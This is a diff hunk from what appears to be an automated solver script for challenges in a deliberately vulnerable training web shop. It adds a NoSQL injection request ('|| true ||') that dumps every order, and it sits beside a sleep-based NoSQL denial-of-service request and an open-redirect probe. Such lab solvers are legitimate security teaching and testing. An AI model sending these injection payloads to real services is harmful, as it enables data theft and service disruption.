@@ -39,6 +39,8 @@ requests.get(url+'/assets/public/images/uploads/😼-%23zatschi-%23whoneedsfourl
 requests.get(url+'/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg')
 # ---- NoSQL DoS (Let the server sleep for some time. (It has done more than enough hard work for you))
 requests.get(url+'/rest/products/sleep(2000)/reviews')
+# ---- NoSQL Exfiltration (All your orders are belong to us! Even the ones which don't.)
+requests.get(url+'/rest/track-order/\'%20%7C%7C%20true%20%7C%7C%20\'')
 # ---- Outdated Whitelist (Let us redirect you to one of our crypto currency addresses which are not promoted any longer.)
 requests.get(url+'/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm')
 # ---- Privacy Policy (Read our privacy policy.)
